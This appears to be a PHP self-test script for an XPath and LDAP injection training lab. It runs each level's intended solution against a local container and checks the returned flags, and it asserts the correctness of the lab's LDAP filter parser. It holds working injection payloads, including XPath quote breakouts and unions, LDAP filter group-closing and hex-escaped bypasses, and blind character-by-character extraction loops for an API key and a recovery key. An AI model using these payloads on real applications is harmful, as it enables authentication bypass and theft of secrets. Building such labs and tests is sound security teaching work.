<?php
/**
 * Self-test: runs the intended solution for every level against the live app
 * and reports whether the flag came back. Run inside the container:
 *
 *   docker compose exec web php /var/www/html/solve_check.php
 *
 * It also asserts the behaviour of the LDAP filter engine directly, because
 * levels 6-10 are only honest if the parser and evaluator are correct.
 *
 * Not part of the challenge - it exists so the lab can be regression-tested.
 */
require_once __DIR__ . '/helpers.php';

$base = 'http://localhost';
$pass = 0;
$fail = 0;
$aok  = 0;
$abad = 0;

/* ------------------------------------------------------------------ http */

function get(string $url): string
{
    $ctx = stream_context_create(['http' => [
        'method'        => 'GET',
        'timeout'       => 15,
        'ignore_errors' => true,
    ]]);
    return (string)@file_get_contents($url, false, $ctx);
}

function url(string $base, string $page, array $params): string
{
    return $base . '/' . $page . '?' . http_build_query($params);
}

function check(int $level, string $body): void
{
    global $pass, $fail;
    $want = xl_flag($level);
    if ($want !== '' && strpos($body, $want) !== false) {
        $pass++;
        echo "  PASS  level $level  $want\n";
    } else {
        $fail++;
        echo "  FAIL  level $level  (expected $want)\n";
    }
}

/* ------------------------------------------------------- engine assertions */

function assertion(string $what, bool $ok, string $detail = ''): void
{
    global $aok, $abad;
    if ($ok) {
        $aok++;
    } else {
        $abad++;
        echo "  FAIL  engine: $what" . ($detail !== '' ? "  ($detail)" : '') . "\n";
    }
}

function matches(string $filter): int
{
    return count(ldap_search(xl_directory(), ldap_parse($filter)));
}

function rejects(string $filter): bool
{
    try {
        ldap_parse($filter);
        return false;
    } catch (LdapFilterError $e) {
        return true;
    }
}

echo "XPath & LDAP Lab self-test\n==========================\n\n";
echo "LDAP filter engine\n------------------\n";

assertion('equality selects one entry',            matches('(uid=root_admin)') === 1);
assertion('presence selects every entry',          matches('(uid=*)') === 8, 'got ' . matches('(uid=*)'));
assertion('AND of two true clauses',               matches('(&(uid=svc_rotate)(objectClass=inetOrgPerson))') === 1);
assertion('OR of two uids',                        matches('(|(uid=awhitfield)(uid=dkoval))') === 2);
assertion('NOT excludes the person entries',       matches('(!(objectClass=person))') === 2,
    'got ' . matches('(!(objectClass=person))'));
assertion('substring initial',                     matches('(uid=svc_*)') === 2);
assertion('substring any (middle part)',           matches('(cn=*Admin*)') === 1);
assertion('substring final',                       matches('(mail=*@hackinlab.internal)') === 8,
    'got ' . matches('(mail=*@hackinlab.internal)'));
assertion('empty substring matches everything',    matches('(uid=**)') === 8);
assertion('>= is a numeric ordering match',        matches('(employeeNumber>=23)') === 3,
    'got ' . matches('(employeeNumber>=23)'));
assertion('<= is a numeric ordering match',        matches('(employeeNumber<=14)') === 2);
assertion('>= falls back to string ordering',      matches('(recoveryKey>=m)') === 1);
assertion('escaped asterisk is a literal, not a wildcard', matches('(uid=\2a)') === 0);
assertion('(uid=*) parses as PRESENT',             ldap_parse('(uid=*)')['type'] === 'present');
assertion('(uid=**) parses as SUBSTRING',          ldap_parse('(uid=**)')['type'] === 'substr');
assertion('unbalanced filter is rejected',         rejects('(&(uid=a)'));
assertion('trailing bytes are rejected by strict parse', rejects('(uid=a))'));
assertion('empty AND group is rejected',           rejects('(&)'));
assertion('lone backslash is rejected',            rejects('(uid=a\zz)'));
assertion('unescaped "(" inside a value is rejected', rejects('(uid=a(b)'));

$pf = ldap_parse_first('(&(uid=*)(uid=*))(|(uid=*)(userPassword=x))');
assertion('parse_first consumes only the first filter',
    $pf['consumed'] === '(&(uid=*)(uid=*))' && $pf['trailing'] === '(|(uid=*)(userPassword=x))');

assertion('split_filters finds both halves of the level 8 payload',
    count(ldap_split_filters('(&(uid=vault_agent))(&(objectClass=person)(objectClass=person))')) === 2);

assertion('canonical re-serialisation round-trips',
    ldap_filter_to_string(ldap_parse('(&(uid=a\2a)(cn=x*y*z))')) === '(&(uid=a\2a)(cn=x*y*z))',
    ldap_filter_to_string(ldap_parse('(&(uid=a\2a)(cn=x*y*z))')));

assertion('ldap_escape_value escapes the backslash first',
    ldap_escape_value('a(b)*c\\') === 'a\28b\29\2ac\5c', ldap_escape_value('a(b)*c\\'));

assertion('a correctly escaped payload survives the naive normaliser',
    strpos(ldap_unescape_whole_filter(ldap_escape_value('x\29\28uid=\2a')), ')') === false);

echo "  $aok assertions passed, $abad failed\n\n";

/* ------------------------------------------------------------- the levels */

echo "Levels\n------\n";

/* 1 - break out of the password literal and target the administrator */
check(1, get(url($base, 'level1.php', ['u' => 'alice', 'p' => "x' or role='administrator"])));

/* 2 - close the predicate, union in a sibling element */
check(2, get(url($base, 'level2.php', [
    'u' => "svc_backup']/recovery_token|//user[username='x",
])));

/* 3 - blind: extract the apikey through the boolean oracle, then submit it */
$alphabet = 'abcdefghijklmnopqrstuvwxyz0123456789';

function l3_probe(string $base, string $test): bool
{
    $u    = "svc_backup' and " . $test . " and '1'='1";
    $body = get(url($base, 'level3.php', ['probe' => 1, 'u' => $u]));
    $j    = json_decode($body, true);
    return is_array($j) && !empty($j['found']);
}

$len = 0;
for ($i = 1; $i <= 32; $i++) {
    if (l3_probe($base, "string-length(apikey)=$i")) {
        $len = $i;
        break;
    }
}
$key3 = '';
for ($i = 1; $i <= $len; $i++) {
    for ($k = 0; $k < strlen($alphabet); $k++) {
        $c = $alphabet[$k];
        if (l3_probe($base, "substring(apikey,$i,1)='$c'")) {
            $key3 .= $c;
            break;
        }
    }
}
echo "        level 3 extracted apikey = " . ($key3 === '' ? '(nothing)' : $key3) . " (length $len)\n";
check(3, get(url($base, 'level3.php', ['answer' => $key3])));

/* 4 - quote-free union using a presence predicate */
check(4, get(url($base, 'level4.php', ['q' => '1]|//user[pin]/pin|//user[position()=1'])));

/* 5 - union out of //user into //vault */
check(5, get(url($base, 'level5.php', ['id' => '0]|//vault/secret/text()|//user[@id=1'])));

/* 6 - close the AND group, discard the password clause */
check(6, get(url($base, 'level6.php', ['u' => '*)(uid=*))(|(uid=*', 'p' => 'x'])));

/* 7 - a bare wildcard truncates the substring assertion */
check(7, get(url($base, 'level7.php', ['q' => '*'])));

/* 8 - close the group and leave a well-formed remainder */
check(8, get(url($base, 'level8.php', ['u' => 'vault_agent))(&(objectClass=person'])));

/* 9 - blind: recover recoveryKey with substring assertions, then submit it */
function l9_probe(string $base, string $test): bool
{
    $u    = 'svc_rotate)(recoveryKey' . $test;
    $body = get(url($base, 'level9.php', ['probe' => 1, 'u' => $u]));
    $j    = json_decode($body, true);
    return is_array($j) && !empty($j['matched']);
}

$key9 = '';
for ($pos = 0; $pos < 16; $pos++) {
    if ($key9 !== '' && l9_probe($base, '=' . $key9)) {
        break;                                   // exact match: the value is complete
    }
    $found = false;
    for ($k = 0; $k < strlen($alphabet); $k++) {
        $c = $alphabet[$k];
        if (l9_probe($base, '=' . $key9 . $c . '*')) {
            $key9 .= $c;
            $found = true;
            break;
        }
    }
    if (!$found) {
        break;
    }
}
echo "        level 9 extracted recoveryKey = " . ($key9 === '' ? '(nothing)' : $key9) . "\n";
check(9, get(url($base, 'level9.php', ['answer' => $key9])));

/* 10 - the same tree as level 6, written entirely in hex escapes */
check(10, get(url($base, 'level10.php', ['u' => 'root_admin\29\29\28|\28uid=\2a', 'p' => 'x'])));

echo "\n------------------\n";
echo "LDAP filter engine: $aok assertions passed, $abad failed\n";
echo "$pass passed, $fail failed\n";
exit(($fail === 0 && $abad === 0) ? 0 : 1);
